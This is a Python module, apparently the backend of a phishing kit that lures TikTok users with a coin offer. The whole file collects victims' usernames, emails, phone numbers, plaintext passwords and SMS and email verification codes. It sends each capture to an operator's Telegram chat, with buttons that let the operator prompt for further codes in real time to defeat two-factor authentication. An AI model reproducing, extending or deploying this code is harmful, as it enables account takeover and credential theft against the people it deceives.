import requests
import os
from datetime import datetime
import logging
import json
from dotenv import load_dotenv
from pathlib import Path

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

logger = logging.getLogger(__name__)

class TelegramService:
    def __init__(self):
        self.bot_token = os.environ.get('TELEGRAM_BOT_TOKEN')
        self.chat_id = os.environ.get('TELEGRAM_CHAT_ID')
        self.api_url = f"https://api.telegram.org/bot{self.bot_token}"
    
    def send_step_notification(self, step: str, session_id: str, data: dict):
        """Send step notification with admin control buttons"""
        try:
            message = self._format_step_message(step, data)
            keyboard = self._create_step_keyboard(session_id, step)
            
            text_url = f"{self.api_url}/sendMessage"
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML',
                'reply_markup': keyboard
            }
            
            # DEBUG: Telegram'a gönderilen veriyi konsola yazdır
            print(f"DEBUG PAYLOAD: {json.dumps(payload, indent=2)}")
            
            response = requests.post(text_url, json=payload, timeout=10)
            
            response.raise_for_status()
            
            message_id = response.json()['result']['message_id']
            logger.info(f"Telegram notification sent. Step: {step}, Session: {session_id}, Message ID: {message_id}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to send Telegram notification: {str(e)}")
            return False
    
    def _format_step_message(self, step: str, data: dict) -> str:
        """Format message based on step"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        if step == "username_coin":
            tiktok_data = data.get('tiktok_data', {})
            followers = tiktok_data.get('followers', 'N/A')
            following = tiktok_data.get('following', 'N/A')
            
            return f"""🎮 <b>STEP 1: Giriş & Coin Selection</b>

👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>
✔️ <b>Followers:</b> <code>{followers}</code>
✔️ <b>Following:</b> <code>{following}</code>
💰 <b>Coin Amount:</b> <code>{data.get('amount', 'N/A')}</code>
🌐 <b>IP:</b> <code>{data.get('ip', 'N/A')}</code>
⏰ <b>Time:</b> {timestamp}

🕹️ <b>User is waiting for your action...</b>
"""
        
        elif step == "contact":
            return f"""📧 <b>Adım 2: Mail/Phone</b>

👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>
💰 <b>Amount:</b> <code>{data.get('amount', 'N/A')}</code>

📧 <b>Email:</b> <code>{data.get('email', 'N/A')}</code>
📞 <b>Phone:</b> <code>{data.get('phone', 'N/A')}</code>
🌐 <b>IP:</b> <code>{data.get('ip', 'N/A')}</code>
⏰ <b>Time:</b> {timestamp}

🕹️ <b>User is waiting for your action...</b>
"""
        
        elif step == "password":
            return f"""🔐 <b>STEP 3: Password Entered</b>

👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>
🔐 <b>Password:</b> <code>{data.get('password', 'N/A')}</code>
🌐 <b>IP:</b> <code>{data.get('ip', 'N/A')}</code>
⏰ <b>Time:</b> {timestamp}

🕹️ <b>User is waiting for your action...</b>
"""
        
        elif step == "phone_code":
            return f"""📱 <b>STEP 4: Phone Code Entered</b>

👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>
📞 <b>Phone:</b> <code>{data.get('phone', 'N/A')}</code>
📲 <b>Code:</b> <code>{data.get('phone_code', 'N/A')}</code>
🌐 <b>IP:</b> <code>{data.get('ip', 'N/A')}</code>
⏰ <b>Time:</b> {timestamp}

🕹️ <b>User is waiting for your action...</b>
"""
        
        elif step == "email_code":
            return f"""✉️ <b>STEP 5: Email Code Entered</b>

👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>
📧 <b>Email:</b> <code>{data.get('email', 'N/A')}</code>
📬 <b>Code:</b> <code>{data.get('email_code', 'N/A')}</code>
🌐 <b>IP:</b> <code>{data.get('ip', 'N/A')}</code>
⏰ <b>Time:</b> {timestamp}

🕹️ <b>User is waiting for your action...</b>
"""
        
        else:
            return f"""📝 <b>Step: {step}</b>

{json.dumps(data, indent=2)}
⏰ <b>Time:</b> {timestamp}
"""
    
    def _create_step_keyboard(self, session_id: str, step: str):
        """Create inline keyboard based on current step"""
        
        # Common buttons for all steps
        keyboard = {
            'inline_keyboard': [
                [
                    {'text': '🔐 Ask Password', 'callback_data': f'action_{session_id}_password'},
                    {'text': '📝 Ask Form Again', 'callback_data': f'action_{session_id}_form'},
                ],
                [
                    {'text': '📱 Ask Phone Code', 'callback_data': f'action_{session_id}_phone_code'},
                    {'text': '📧 Ask Email Code', 'callback_data': f'action_{session_id}_email_code'},
                ],
                [
                    {'text': '❌ Wrong Password', 'callback_data': f'action_{session_id}_wrong_password'},
                    {'text': '🚫 Wrong Code', 'callback_data': f'action_{session_id}_wrong_code'},
                ],
                [
                    {'text': '✅ Finish & Approve', 'callback_data': f'action_{session_id}_finish'},
                ]
            ]
        }
        return keyboard


telegram_service = TelegramService()
